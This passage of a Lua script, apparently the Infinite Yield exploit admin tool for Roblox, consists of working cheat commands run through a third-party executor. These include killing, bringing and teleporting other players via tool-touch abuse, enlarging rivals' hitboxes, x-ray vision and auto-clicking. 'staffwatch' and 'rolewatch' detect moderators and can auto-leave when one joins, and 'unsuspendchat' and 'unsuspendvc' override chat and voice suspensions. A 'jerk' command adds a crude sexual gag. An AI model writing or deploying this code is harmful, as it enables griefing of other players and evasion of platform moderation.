				until (tool.Parent ~= char or not hrp or not hrp2 or not hrp.Parent or not hrp2.Parent or n > 250) and n > 2
			else
				notify('Tool Required','You need to have an item in your inventory to use this command')
			end
		end
	
		function kill(speaker,target,fast)
			if tools(speaker) then
				if target ~= nil then
					local NormPos = getRoot(speaker.Character).CFrame
					if not fast then
						refresh(speaker)
						wait()
						repeat wait() until speaker.Character ~= nil and getRoot(speaker.Character)
						wait(0.3)
					end
					local hrp = getRoot(speaker.Character)
					attach(speaker,target)
					repeat
						wait()
						hrp.CFrame = CFrame.new(999999, workspace.FallenPartsDestroyHeight + 5,999999)
					until not getRoot(target.Character) or not getRoot(speaker.Character)
					speaker.CharacterAdded:Wait():WaitForChild("HumanoidRootPart").CFrame = NormPos
				end
			else
				notify('Tool Required','You need to have an item in your inventory to use this command')
			end
		end
	
		addcmd("handlekill", {"hkill"}, function(args, speaker)
			if not firetouchinterest then
				return notify("Incompatible Exploit", "Your exploit does not support this command (missing firetouchinterest)")
			end
			if not speaker.Character then return end
			local tool = speaker.Character:FindFirstChildWhichIsA("Tool")
			local handle = tool and tool:FindFirstChild("Handle")
			if not handle then
				return notify("Handle Kill", "You need to hold a \"Tool\" that does damage on touch. For example a common Sword tool.")
			end
			local range = tonumber(args[2]) or math.huge
			if range ~= math.huge then notify("Handle Kill", ("Started!\nRadius: %s"):format(tostring(range):upper())) end
	
			while task.wait() and speaker.Character and tool.Parent and tool.Parent == speaker.Character do
				for _, plr in next, getPlayer(args[1], speaker) do
					plr = Players[plr]
					if plr ~= speaker and plr.Character then
						local hum = plr.Character:FindFirstChildWhichIsA("Humanoid")
						local root = hum and getRoot(plr.Character)
	
						if root and hum.Health > 0 and hum:GetState() ~= Enum.HumanoidStateType.Dead and speaker:DistanceFromCharacter(root.Position) <= range then
							firetouchinterest(handle, root, 1)
							firetouchinterest(handle, root, 0)
						end
					end
				end
			end
	
			notify("Handle Kill", "Stopped!")
		end)
	
		local hb = RunService.Heartbeat
		addcmd('tpwalk', {'teleportwalk'}, function(args, speaker)
			tpwalking = true
			local chr = speaker.Character
			local hum = chr and chr:FindFirstChildWhichIsA("Humanoid")
			while tpwalking and chr and hum and hum.Parent do
				local delta = hb:Wait()
				if hum.MoveDirection.Magnitude > 0 then
					if args[1] and isNumber(args[1]) then
						chr:TranslateBy(hum.MoveDirection * tonumber(args[1]) * delta * 10)
					else
						chr:TranslateBy(hum.MoveDirection * delta * 10)
					end
				end
			end
		end)
	
		addcmd('untpwalk', {'unteleportwalk'}, function(args, speaker)
			tpwalking = false
		end)
	
		function bring(speaker,target,fast)
			if tools(speaker) then
				if target ~= nil then
					local NormPos = getRoot(speaker.Character).CFrame
					if not fast then
						refresh(speaker)
						wait()
						repeat wait() until speaker.Character ~= nil and getRoot(speaker.Character)
						wait(0.3)
					end
					local hrp = getRoot(speaker.Character)
					attach(speaker,target)
					repeat
						wait()
						hrp.CFrame = NormPos
					until not getRoot(target.Character) or not getRoot(speaker.Character)
					speaker.CharacterAdded:Wait():WaitForChild("HumanoidRootPart").CFrame = NormPos
				end
			else
				notify('Tool Required','You need to have an item in your inventory to use this command')
			end
		end
	
		function teleport(speaker,target,target2,fast)
			if tools(speaker) then
				if target ~= nil then
					local NormPos = getRoot(speaker.Character).CFrame
					if not fast then
						refresh(speaker)
						wait()
						repeat wait() until speaker.Character ~= nil and getRoot(speaker.Character)
						wait(0.3)
					end
					local hrp = getRoot(speaker.Character)
					local hrp2 = getRoot(target2.Character)
					attach(speaker,target)
					repeat
						wait()
						hrp.CFrame = hrp2.CFrame
					until not getRoot(target.Character) or not getRoot(speaker.Character)
					wait(1)
					speaker.CharacterAdded:Wait():WaitForChild("HumanoidRootPart").CFrame = NormPos
				end
			else
				notify('Tool Required','You need to have an item in your inventory to use this command')
			end
		end
	
		addcmd('spin',{},function(args, speaker)
			local spinSpeed = 20
			if args[1] and isNumber(args[1]) then
				spinSpeed = args[1]
			end
			for i,v in pairs(getRoot(speaker.Character):GetChildren()) do
				if v.Name == "Spinning" then
					v:Destroy()
				end
			end
			local Spin = Instance.new("BodyAngularVelocity")
			Spin.Name = "Spinning"
			Spin.Parent = getRoot(speaker.Character)
			Spin.MaxTorque = Vector3.new(0, math.huge, 0)
			Spin.AngularVelocity = Vector3.new(0,spinSpeed,0)
		end)
	
		addcmd('unspin',{},function(args, speaker)
			for i,v in pairs(getRoot(speaker.Character):GetChildren()) do
				if v.Name == "Spinning" then
					v:Destroy()
				end
			end
		end)
	
		xrayEnabled = false
		function xray()
			for _, v in pairs(workspace:GetDescendants()) do
				if v:IsA("BasePart") and not v.Parent:FindFirstChildWhichIsA("Humanoid") and not v.Parent.Parent:FindFirstChildWhichIsA("Humanoid") then
					v.LocalTransparencyModifier = xrayEnabled and 0.5 or 0
				end
			end
		end
	
		addcmd("xray", {}, function(args, speaker)
			xrayEnabled = true
			xray()
		end)
	
		addcmd("unxray", {"noxray"}, function(args, speaker)
			xrayEnabled = false
			xray()
		end)
	
		addcmd("togglexray", {}, function(args, speaker)
			xrayEnabled = not xrayEnabled
			xray()
		end)
	
		addcmd("loopxray", {}, function(args, speaker)
			pcall(function() xrayLoop:Disconnect() end)
			xrayLoop = RunService.RenderStepped:Connect(function()
				xrayEnabled = true
				xray()
			end)
		end)
	
		addcmd("unloopxray", {}, function(args, speaker)
			pcall(function() xrayLoop:Disconnect() end)
			xrayEnabled = false
			xray()
		end)
	
		local walltpTouch = nil
		addcmd('walltp',{},function(args, speaker)
			local torso
			if r15(speaker) then
				torso = speaker.Character.UpperTorso
			else
				torso = speaker.Character.Torso
			end
			local function touchedFunc(hit)
				local Root = getRoot(speaker.Character)
				if hit:IsA("BasePart") and hit.Position.Y > Root.Position.Y - speaker.Character:FindFirstChildOfClass('Humanoid').HipHeight then
					local hitP = getRoot(hit.Parent)
					if hitP ~= nil then
						Root.CFrame = hit.CFrame * CFrame.new(Root.CFrame.lookVector.X,hitP.Size.Z/2 + speaker.Character:FindFirstChildOfClass('Humanoid').HipHeight,Root.CFrame.lookVector.Z)
					elseif hitP == nil then
						Root.CFrame = hit.CFrame * CFrame.new(Root.CFrame.lookVector.X,hit.Size.Y/2 + speaker.Character:FindFirstChildOfClass('Humanoid').HipHeight,Root.CFrame.lookVector.Z)
					end
				end
			end
			walltpTouch = torso.Touched:Connect(touchedFunc)
		end)
	
		addcmd('unwalltp',{'nowalltp'},function(args, speaker)
			if walltpTouch then
				walltpTouch:Disconnect()
			end
		end)
	
		autoclicking = false
		addcmd('autoclick',{},function(args, speaker)
			if mouse1press and mouse1release then
				execCmd('unautoclick')
				wait()
				local clickDelay = 0.1
				local releaseDelay = 0.1
				if args[1] and isNumber(args[1]) then clickDelay = args[1] end
				if args[2] and isNumber(args[2]) then releaseDelay = args[2] end
				autoclicking = true
				cancelAutoClick = UserInputService.InputBegan:Connect(function(input, gameProcessedEvent)
					if not gameProcessedEvent then
						if (input.KeyCode == Enum.KeyCode.Backspace and UserInputService:IsKeyDown(Enum.KeyCode.Equals)) or (input.KeyCode == Enum.KeyCode.Equals and UserInputService:IsKeyDown(Enum.KeyCode.Backspace)) then
							autoclicking = false
							cancelAutoClick:Disconnect()
						end
					end
				end)
				notify('Auto Clicker',"Press [backspace] and [=] at the same time to stop")
				repeat wait(clickDelay)
					mouse1press()
					wait(releaseDelay)
					mouse1release()
				until autoclicking == false
			else
				notify('Auto Clicker',"Your exploit doesn't have the ability to use the autoclick")
			end
		end)
	
		addcmd('unautoclick',{'noautoclick'},function(args, speaker)
			autoclicking = false
			if cancelAutoClick then cancelAutoClick:Disconnect() end
		end)
	
		addcmd('mousesensitivity',{'ms'},function(args, speaker)
			UserInputService.MouseDeltaSensitivity = args[1]
		end)
	
		local nameBox = nil
		local nbSelection = nil
		addcmd('hovername',{},function(args, speaker)
			execCmd('unhovername')
			wait()
			nameBox = Instance.new("TextLabel")
			nameBox.Name = randomString()
			nameBox.Parent = ScaledHolder
			nameBox.BackgroundTransparency = 1
			nameBox.Size = UDim2.new(0,200,0,30)
			nameBox.Font = Enum.Font.Code
			nameBox.TextSize = 16
			nameBox.Text = ""
			nameBox.TextColor3 = Color3.new(1, 1, 1)
			nameBox.TextStrokeTransparency = 0
			nameBox.TextXAlignment = Enum.TextXAlignment.Left
			nameBox.ZIndex = 10
			nbSelection = Instance.new('SelectionBox')
			nbSelection.Name = randomString()
			nbSelection.LineThickness = 0.03
			nbSelection.Color3 = Color3.new(1, 1, 1)
			local function updateNameBox()
				local t
				local target = IYMouse.Target
	
				if target then
					local humanoid = target.Parent:FindFirstChildOfClass("Humanoid") or target.Parent.Parent:FindFirstChildOfClass("Humanoid")
					if humanoid then
						t = humanoid.Parent
					end
				end
	
				if t ~= nil then
					local x = IYMouse.X
					local y = IYMouse.Y
					local xP
					local yP
					if IYMouse.X > 200 then
						xP = x - 205
						nameBox.TextXAlignment = Enum.TextXAlignment.Right
					else
						xP = x + 25
						nameBox.TextXAlignment = Enum.TextXAlignment.Left
					end
					nameBox.Position = UDim2.new(0, xP, 0, y)
					nameBox.Text = t.Name
					nameBox.Visible = true
					nbSelection.Parent = t
					nbSelection.Adornee = t
				else
					nameBox.Visible = false
					nbSelection.Parent = nil
					nbSelection.Adornee = nil
				end
			end
			nbUpdateFunc = IYMouse.Move:Connect(updateNameBox)
		end)
	
		addcmd('unhovername',{'nohovername'},function(args, speaker)
			if nbUpdateFunc then
				nbUpdateFunc:Disconnect()
				nameBox:Destroy()
				nbSelection:Destroy()
			end
		end)
	
		addcmd('headsize',{},function(args, speaker)
			local players = getPlayer(args[1], speaker)
			for i,v in pairs(players) do
				if Players[v] ~= speaker and Players[v].Character:FindFirstChild('Head') then
					local sizeArg = tonumber(args[2])
					local Size = Vector3.new(sizeArg,sizeArg,sizeArg)
					local Head = Players[v].Character:FindFirstChild('Head')
					if Head:IsA("BasePart") then
						Head.CanCollide = false
						if not args[2] or sizeArg == 1 then
							Head.Size = Vector3.new(2,1,1)
						else
							Head.Size = Size
						end
					end
				end
			end
		end)
	
		addcmd('hitbox',{},function(args, speaker)
			local players = getPlayer(args[1], speaker)
			local transparency = args[3] and tonumber(args[3]) or 0.4
			for i,v in pairs(players) do
				if Players[v] ~= speaker and Players[v].Character:FindFirstChild('HumanoidRootPart') then
					local sizeArg = tonumber(args[2])
					local Size = Vector3.new(sizeArg,sizeArg,sizeArg)
					local Root = Players[v].Character:FindFirstChild('HumanoidRootPart')
					if Root:IsA("BasePart") then
						Root.CanCollide = false
						if not args[2] or sizeArg == 1 then
							Root.Size = Vector3.new(2,1,1)
							Root.Transparency = transparency
						else
							Root.Size = Size
							Root.Transparency = transparency
						end
					end
				end
			end
		end)
	
		addcmd('stareat',{'stare'},function(args, speaker)
			local players = getPlayer(args[1], speaker)
			for i,v in pairs(players) do
				if stareLoop then
					stareLoop:Disconnect()
				end
				if not Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart") and Players[v].Character:FindFirstChild("HumanoidRootPart") then return end
				local function stareFunc()
					if Players.LocalPlayer.Character.PrimaryPart and Players:FindFirstChild(v) and Players[v].Character ~= nil and Players[v].Character:FindFirstChild("HumanoidRootPart") then
						local chrPos=Players.LocalPlayer.Character.PrimaryPart.Position
						local tPos=Players[v].Character:FindFirstChild("HumanoidRootPart").Position
						local modTPos=Vector3.new(tPos.X,chrPos.Y,tPos.Z)
						local newCF=CFrame.new(chrPos,modTPos)
						Players.LocalPlayer.Character:SetPrimaryPartCFrame(newCF)
					elseif not Players:FindFirstChild(v) then
						stareLoop:Disconnect()
					end
				end
	
				stareLoop = RunService.RenderStepped:Connect(stareFunc)
			end
		end)
	
		addcmd('unstareat',{'unstare','nostare','nostareat'},function(args, speaker)
			if stareLoop then
				stareLoop:Disconnect()
			end
		end)
	
		RolewatchData = {Group = 0, Role = "", Leave = false}
		RolewatchConnection = Players.PlayerAdded:Connect(function(player)
			if RolewatchData.Group == 0 then return end
			if player:IsInGroup(RolewatchData.Group) then
				if tostring(player:GetRoleInGroup(RolewatchData.Group)):lower() == RolewatchData.Role:lower() then
					if RolewatchData.Leave == true then
						Players.LocalPlayer:Kick("\n\nRolewatch\nPlayer \"" .. tostring(player.Name) .. "\" has joined with the Role \"" .. RolewatchData.Role .. "\"\n")
					else
						notify("Rolewatch", "Player \"" .. tostring(player.Name) .. "\" has joined with the Role \"" .. RolewatchData.Role .. "\"")
					end
				end
			end
		end)
	
		addcmd("rolewatch", {}, function(args, speaker)
			local groupId = tonumber(args[1] or 0)
			local roleName = args[2] and tostring(getstring(2))
			if groupId and roleName then
				RolewatchData.Group = groupId
				RolewatchData.Role = roleName
				notify("Rolewatch", "Watching Group ID \"" .. tostring(groupId) .. "\" for Role \"" .. roleName .. "\"")
			end
		end)
	
		addcmd("rolewatchstop", {}, function(args, speaker)
			RolewatchData.Group = 0
			RolewatchData.Role = ""
			RolewatchData.Leave = false
			notify("Rolewatch", "Disabled")
		end)
	
		addcmd("rolewatchleave", {"unrolewatch"}, function(args, speaker)
			RolewatchData.Leave = not RolewatchData.Leave
			notify("Rolewatch", RolewatchData.Leave and "Leave has been Enabled" or "Leave has been Disabled")
		end)
	
		staffRoles = {"mod", "admin", "staff", "dev", "founder", "owner", "supervis", "manager", "management", "executive", "president", "chairman", "chairwoman", "chairperson", "director"}
	
		getStaffRole = function(player)
			local playerRole = player:GetRoleInGroup(game.CreatorId)
			local result = {Role = playerRole, Staff = false}
			if player:IsInGroup(1200769) then
				result.Role = "Roblox Employee"
				result.Staff = true
			end
			for _, role in pairs(staffRoles) do
				if string.find(string.lower(playerRole), role) then
					result.Staff = true
				end
			end
			return result
		end
	
		addcmd("staffwatch", {}, function(args, speaker)
			if staffwatchjoin then
				staffwatchjoin:Disconnect()
			end
			if game.CreatorType == Enum.CreatorType.Group then
				local found = {}
				staffwatchjoin = Players.PlayerAdded:Connect(function(player)
					local result = getStaffRole(player)
					if result.Staff then
						notify("Staffwatch", formatUsername(player) .. " is a " .. result.Role)
					end
				end)
				for _, player in pairs(Players:GetPlayers()) do
					local result = getStaffRole(player)
					if result.Staff then
						table.insert(found, formatUsername(player) .. " is a " .. result.Role)
					end
				end
				if #found > 0 then
					notify("Staffwatch", table.concat(found, ",\n"))
				else
					notify("Staffwatch", "Enabled")
				end
			else
				notify("Staffwatch", "Game is not owned by a Group")
			end
		end)
	
		addcmd("unstaffwatch", {}, function(args, speaker)
			if staffwatchjoin then
				staffwatchjoin:Disconnect()
			end
			notify("Staffwatch", "Disabled")
		end)
	
		addcmd('removeterrain',{'rterrain','noterrain'},function(args, speaker)
			workspace:FindFirstChildOfClass('Terrain'):Clear()
		end)
	
		addcmd('clearnilinstances',{'nonilinstances','cni'},function(args, speaker)
			if getnilinstances then
				for i,v in pairs(getnilinstances()) do
					v:Destroy()
				end
			else
				notify('Incompatible Exploit','Your exploit does not support this command (missing getnilinstances)')
			end
		end)
	
		addcmd('destroyheight',{'dh'},function(args, speaker)
			local dh = args[1] or -500
			if isNumber(dh) then
				workspace.FallenPartsDestroyHeight = dh
			end
		end)
	
		OrgDestroyHeight = workspace.FallenPartsDestroyHeight
		addcmd("antivoid", {}, function(args, speaker)
			execCmd("unantivoid nonotify")
			task.wait()
			antivoidloop = RunService.Stepped:Connect(function()
				local root = getRoot(speaker.Character)
				if root and root.Position.Y <= OrgDestroyHeight + 25 then
					root.Velocity = root.Velocity + Vector3.new(0, 250, 0)
				end
			end)
			if args[1] ~= "nonotify" then notify("antivoid", "Enabled") end
		end)
	
		addcmd("unantivoid", {"noantivoid"}, function(args, speaker)
			pcall(function() antivoidloop:Disconnect() end)
			antivoidloop = nil
			if args[1] ~= "nonotify" then notify("antivoid", "Disabled") end
		end)
	
		antivoidWasEnabled = false
		addcmd("fakeout", {}, function(args, speaker)
			local root = getRoot(speaker.Character)
			local oldpos = root.CFrame
			if antivoidloop then
				execCmd("unantivoid nonotify")
				antivoidWasEnabled = true
			end
			workspace.FallenPartsDestroyHeight = 0/1/0
			root.CFrame = CFrame.new(Vector3.new(0, OrgDestroyHeight - 25, 0))
			task.wait(1)
			root.CFrame = oldpos
			workspace.FallenPartsDestroyHeight = OrgDestroyHeight
			if antivoidWasEnabled then
				execCmd("antivoid nonotify")
				antivoidWasEnabled = false
			end
		end)
	
		addcmd("trip", {}, function(args, speaker)
			local humanoid = speaker.Character and speaker.Character:FindFirstChildWhichIsA("Humanoid")
			local root = speaker.Character and getRoot(speaker.Character)
			if humanoid and root then
				humanoid:ChangeState(Enum.HumanoidStateType.FallingDown)
				root.Velocity = root.CFrame.LookVector * 30
			end
		end)
	
		addcmd("removeads", {"adblock"}, function(args, speaker)
			while wait() do
				pcall(function()
					for i, v in pairs(workspace:GetDescendants()) do
						if v:IsA("PackageLink") then
							if v.Parent:FindFirstChild("ADpart") then
								v.Parent:Destroy()
							end
							if v.Parent:FindFirstChild("AdGuiAdornee") then
								v.Parent.Parent:Destroy()
							end
						end
					end
				end)
			end
		end)
	
		addcmd("scare", {"spook"}, function(args, speaker)
			local players = getPlayer(args[1], speaker)
			local oldpos = nil
	
			for _, v in pairs(players) do
				local root = speaker.Character and getRoot(speaker.Character)
				local target = Players[v]
				local targetRoot = target and target.Character and getRoot(target.Character)
	
				if root and targetRoot and target ~= speaker then
					oldpos = root.CFrame
					root.CFrame = targetRoot.CFrame + targetRoot.CFrame.lookVector * 2
					root.CFrame = CFrame.new(root.Position, targetRoot.Position)
					task.wait(0.5)
					root.CFrame = oldpos
				end
			end
		end)
	
		addcmd("alignmentkeys", {}, function(args, speaker)
			alignmentKeys = UserInputService.InputBegan:Connect(function(input, gameProcessed)
				if gameProcessed then return end
				if input.KeyCode == Enum.KeyCode.Comma then workspace.CurrentCamera:PanUnits(-1) end
				if input.KeyCode == Enum.KeyCode.Period then workspace.CurrentCamera:PanUnits(1) end
			end)
			alignmentKeysEmotes = StarterGui:GetCoreGuiEnabled(Enum.CoreGuiType.EmotesMenu)
			StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.EmotesMenu, false)
		end)
	
		addcmd("unalignmentkeys", {"noalignmentkeys"}, function(args, speaker)
			if type(alignmentKeysEmotes) == "boolean" then
				StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.EmotesMenu, alignmentKeysEmotes)
			end
			alignmentKeys:Disconnect()
		end)
	
		addcmd("ctrllock", {}, function(args, speaker)
			local mouseLockController = speaker.PlayerScripts:WaitForChild("PlayerModule"):WaitForChild("CameraModule"):WaitForChild("MouseLockController")
			local boundKeys = mouseLockController:FindFirstChild("BoundKeys")
	
			if boundKeys then
				boundKeys.Value = "LeftControl"
			else
				boundKeys = Instance.new("StringValue")
				boundKeys.Name = "BoundKeys"
				boundKeys.Value = "LeftControl"
				boundKeys.Parent = mouseLockController
			end
		end)
	
		addcmd("unctrllock", {}, function(args, speaker)
			local mouseLockController = speaker.PlayerScripts:WaitForChild("PlayerModule"):WaitForChild("CameraModule"):WaitForChild("MouseLockController")
			local boundKeys = mouseLockController:FindFirstChild("BoundKeys")
	
			if boundKeys then
				boundKeys.Value = "LeftShift"
			else
				boundKeys = Instance.new("StringValue")
				boundKeys.Name = "BoundKeys"
				boundKeys.Value = "LeftShift"
				boundKeys.Parent = mouseLockController
			end
		end)
	
		addcmd("listento", {}, function(args, speaker)
			execCmd("unlistento")
			if not args[1] then return end
	
			local player = Players:FindFirstChild(getPlayer(args[1], speaker)[1])
			local root = player and player.Character and getRoot(player.Character)
	
			if root then
				SoundService:SetListener(Enum.ListenerType.ObjectPosition, root)
				listentoChar = player.CharacterAdded:Connect(function()
					repeat task.wait() until Players[player.Name].Character ~= nil and getRoot(Players[player.Name].Character)
					SoundService:SetListener(Enum.ListenerType.ObjectPosition, getRoot(Players[player.Name].Character))
				end)
			end
		end)
	
		addcmd("unlistento", {}, function(args, speaker)
			SoundService:SetListener(Enum.ListenerType.Camera)
			listentoChar:Disconnect()
		end)
	
		addcmd("jerk", {}, function(args, speaker)
			local humanoid = speaker.Character:FindFirstChildWhichIsA("Humanoid")
			local backpack = speaker:FindFirstChildWhichIsA("Backpack")
			if not humanoid or not backpack then return end
	
			local tool = Instance.new("Tool")
			tool.Name = "Jerk Off"
			tool.ToolTip = "in the stripped club. straight up \"jorking it\" . and by \"it\" , haha, well. let's justr say. My peanits."
			tool.RequiresHandle = false
			tool.Parent = backpack
	
			local jorkin = false
			local track = nil
	
			local function stopTomfoolery()
				jorkin = false
				if track then
					track:Stop()
					track = nil
				end
			end
	
			tool.Equipped:Connect(function() jorkin = true end)
			tool.Unequipped:Connect(stopTomfoolery)
			humanoid.Died:Connect(stopTomfoolery)
	
			while task.wait() do
				if not jorkin then continue end
	
				local isR15 = r15(speaker)
				if not track then
					local anim = Instance.new("Animation")
					anim.AnimationId = not isR15 and "rbxassetid://72042024" or "rbxassetid://698251653"
					track = humanoid:LoadAnimation(anim)
				end
	
				track:Play()
				track:AdjustSpeed(isR15 and 0.7 or 0.65)
				track.TimePosition = 0.6
				task.wait(0.1)
				while track and track.TimePosition < (not isR15 and 0.65 or 0.7) do task.wait(0.1) end
				if track then
					track:Stop()
					track = nil
				end
			end
		end)
	
		addcmd("guiscale", {}, function(args, speaker)
			if args[1] and isNumber(args[1]) then
				local scale = tonumber(args[1])
				if scale % 1 == 0 then scale = scale / 100 end
				-- me when i divide and it explodes
				if scale == 0.01 then scale = 1 end
				if scale == 0.02 then scale = 2 end
	
				if scale >= 0.4 and scale <= 2 then
					guiScale = scale
				end
			else
				guiScale = defaultGuiScale
			end
	
			Scale.Scale = math.max(Holder.AbsoluteSize.X / 1920, guiScale)
			updatesaves()
		end)
	
		addcmd("unsuspendchat", {}, function(args, speaker)
			if replicatesignal then
				replicatesignal(TextChatService.UpdateChatTimeout, speaker.UserId, 0, 10)
			else
				notify("Incompatible Exploit", "Your exploit does not support this command (missing replicatesignal)")
			end
		end)
	
		addcmd("unsuspendvc", {}, function(args, speaker)
			if replicatesignal then
				replicatesignal(VoiceChatService.ClientRetryJoin)
	
				if typeof(onVoiceModerated) ~= "RBXScriptConnection" then
					onVoiceModerated = cloneref(game:GetService("VoiceChatInternal")).LocalPlayerModerated:Connect(function()
						task.wait(1)
						replicatesignal(VoiceChatService.ClientRetryJoin)
					end)
				end
			else
				notify("Incompatible Exploit", "Your exploit does not support this command (missing replicatesignal)")
			end
		end)
	
		addcmd("permadeath", {}, function(args, speaker)
			if replicatesignal then
				permadeath(speaker)
				notify("Permadeath", "Enabled")
			else
				notify("Incompatible Exploit", "Your exploit does not support this command (missing replicatesignal)")
			end
		end)
	
		local freezingua = nil
		frozenParts = {}
		addcmd('freezeunanchored',{'freezeua'},function(args, speaker)
			local badnames = {
				"Head",
				"UpperTorso",
				"LowerTorso",
				"RightUpperArm",
				"LeftUpperArm",
				"RightLowerArm",
				"LeftLowerArm",
				"RightHand",
				"LeftHand",
				"RightUpperLeg",
				"LeftUpperLeg",
				"RightLowerLeg",
				"LeftLowerLeg",
				"RightFoot",
				"LeftFoot",
				"Torso",
				"Right Arm",
				"Left Arm",
				"Right Leg",
				"Left Leg",
				"HumanoidRootPart"
			}
			local function FREEZENOOB(v)
				if v:IsA("BasePart" or "UnionOperation") and v.Anchored == false then
					local BADD = false
					for i = 1,#badnames do
						if v.Name == badnames[i] then
							BADD = true
						end
					end
					if speaker.Character and v:IsDescendantOf(speaker.Character) then
						BADD = true
					end
					if BADD == false then
						for i,c in pairs(v:GetChildren()) do
							if c:IsA("BodyPosition") or c:IsA("BodyGyro") then
								c:Destroy()
							end
						end
						local bodypos = Instance.new("BodyPosition")
						bodypos.Parent = v
						bodypos.Position = v.Position
						bodypos.MaxForce = Vector3.new(math.huge,math.huge,math.huge)
						local bodygyro = Instance.new("BodyGyro")
						bodygyro.Parent = v
						bodygyro.CFrame = v.CFrame
						bodygyro.MaxTorque = Vector3.new(math.huge,math.huge,math.huge)
						if not table.find(frozenParts,v) then
							table.insert(frozenParts,v)
						end
					end
				end
			end
			for i,v in pairs(workspace:GetDescendants()) do
				FREEZENOOB(v)
			end
			freezingua = workspace.DescendantAdded:Connect(FREEZENOOB)
		end)
	
		addcmd('thawunanchored',{'thawua','unfreezeunanchored','unfreezeua'},function(args, speaker)
			if freezingua then
				freezingua:Disconnect()
			end
			for i,v in pairs(frozenParts) do
				for i,c in pairs(v:GetChildren()) do
					if c:IsA("BodyPosition") or c:IsA("BodyGyro") then
						c:Destroy()
					end
				end
			end
			frozenParts = {}
		end)
	
		addcmd('tpunanchored',{'tpua'},function(args, speaker)
			local players = getPlayer(args[1], speaker)
			for i,v in pairs(players) do
				local Forces = {}
				for _,part in pairs(workspace:GetDescendants()) do
					if Players[v].Character:FindFirstChild('Head') and part:IsA("BasePart" or "UnionOperation" or "Model") and part.Anchored == false and not part:IsDescendantOf(speaker.Character) and part.Name == "Torso" == false and part.Name == "Head" == false and part.Name == "Right Arm" == false and part.Name == "Left Arm" == false and part.Name == "Right Leg" == false and part.Name == "Left Leg" == false and part.Name == "HumanoidRootPart" == false then
						for i,c in pairs(part:GetChildren()) do
							if c:IsA("BodyPosition") or c:IsA("BodyGyro") then
								c:Destroy()
							end
						end
						local ForceInstance = Instance.new("BodyPosition")
						ForceInstance.Parent = part
						ForceInstance.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
						table.insert(Forces, ForceInstance)
						if not table.find(frozenParts,part) then
							table.insert(frozenParts,part)
						end
					end
				end
				for i,c in pairs(Forces) do
					c.Position = Players[v].Character.Head.Position
				end
			end
		end)
	
		keycodeMap = {
			["0"] = 0x30,
			["1"] = 0x31,
			["2"] = 0x32,
			["3"] = 0x33,
			["4"] = 0x34,
			["5"] = 0x35,
			["6"] = 0x36,
			["7"] = 0x37,
			["8"] = 0x38,
			["9"] = 0x39,
			["a"] = 0x41,
			["b"] = 0x42,
			["c"] = 0x43,
			["d"] = 0x44,
			["e"] = 0x45,
			["f"] = 0x46,
			["g"] = 0x47,
			["h"] = 0x48,
			["i"] = 0x49,
			["j"] = 0x4A,
			["k"] = 0x4B,
			["l"] = 0x4C,
			["m"] = 0x4D,
			["n"] = 0x4E,
			["o"] = 0x4F,
			["p"] = 0x50,
			["q"] = 0x51,
			["r"] = 0x52,
			["s"] = 0x53,
			["t"] = 0x54,
			["u"] = 0x55,
			["v"] = 0x56,
			["w"] = 0x57,
			["x"] = 0x58,
			["y"] = 0x59,
			["z"] = 0x5A,
			["enter"] = 0x0D,
			["shift"] = 0x10,
			["ctrl"] = 0x11,
			["alt"] = 0x12,
			["pause"] = 0x13,
			["capslock"] = 0x14,
			["spacebar"] = 0x20,
			["space"] = 0x20,
			["pageup"] = 0x21,
			["pagedown"] = 0x22,
			["end"] = 0x23,
			["home"] = 0x24,
			["left"] = 0x25,
			["up"] = 0x26,
			["right"] = 0x27,
			["down"] = 0x28,
			["insert"] = 0x2D,
			["delete"] = 0x2E,
			["f1"] = 0x70,
			["f2"] = 0x71,
			["f3"] = 0x72,
			["f4"] = 0x73,
			["f5"] = 0x74,
			["f6"] = 0x75,
			["f7"] = 0x76,
			["f8"] = 0x77,
			["f9"] = 0x78,
			["f10"] = 0x79,
			["f11"] = 0x7A,
			["f12"] = 0x7B,
		}
		autoKeyPressing = false
		cancelAutoKeyPress = nil
	
		addcmd('autokeypress',{'keypress'},function(args, speaker)
			if keypress and keyrelease and args[1] then
				local code = keycodeMap[args[1]:lower()]
				if not code then notify('Auto Key Press',"Invalid key") return end
				execCmd('unautokeypress')
				wait()
				local clickDelay = 0.1
				local releaseDelay = 0.1
				if args[2] and isNumber(args[2]) then clickDelay = args[2] end
				if args[3] and isNumber(args[3]) then releaseDelay = args[3] end
				autoKeyPressing = true
				cancelAutoKeyPress = UserInputService.InputBegan:Connect(function(input, gameProcessedEvent)
					if not gameProcessedEvent then
						if (input.KeyCode == Enum.KeyCode.Backspace and UserInputService:IsKeyDown(Enum.KeyCode.Equals)) or (input.KeyCode == Enum.KeyCode.Equals and UserInputService:IsKeyDown(Enum.KeyCode.Backspace)) then
							autoKeyPressing = false
							cancelAutoKeyPress:Disconnect()
						end
					end
				end)
				notify('Auto Key Press',"Press [backspace] and [=] at the same time to stop")
				repeat wait(clickDelay)
					keypress(code)
					wait(releaseDelay)
					keyrelease(code)
				until autoKeyPressing == false
				if cancelAutoKeyPress then cancelAutoKeyPress:Disconnect() keyrelease(code) end
			else
				notify('Auto Key Press',"Your exploit doesn't have the ability to use auto key press")
			end
		end)
	
		addcmd('unautokeypress',{'noautokeypress','unkeypress','nokeypress'},function(args, speaker)
			autoKeyPressing = false
			if cancelAutoKeyPress then cancelAutoKeyPress:Disconnect() end
		end)
	
		addcmd('addplugin',{'plugin'},function(args, speaker)
			addPlugin(getstring(1))
		end)
	
		addcmd('removeplugin',{'deleteplugin'},function(args, speaker)
			deletePlugin(getstring(1))
		end)
	
		addcmd('reloadplugin',{},function(args, speaker)
			local pluginName = getstring(1)
			deletePlugin(pluginName)
			wait(1)
			addPlugin(pluginName)
		end)
	
		addcmd("addallplugins", {"loadallplugins"}, function(args, speaker)
			if not listfiles or not isfolder then
				notify("Incompatible Exploit", "Your exploit does not support this command (missing listfiles/isfolder)")
				return
			end
	
			for _, filePath in ipairs(listfiles("")) do
				local fileName = filePath:match("([^/\\]+%.iy)$")
	
				if fileName and
					fileName:lower() ~= "iy_fe.iy" and
					not isfolder(fileName) and
					not table.find(PluginsTable, fileName)
				then
					addPlugin(fileName)
				end
			end
		end)
	
		addcmd('removecmd',{'deletecmd'},function(args, speaker)
			removecmd(args[1])
		end)
	
		if IsOnMobile then
			local QuickCapture = Instance.new("TextButton")
			local UICorner = Instance.new("UICorner")
			QuickCapture.Name = randomString()
			QuickCapture.Parent = PARENT
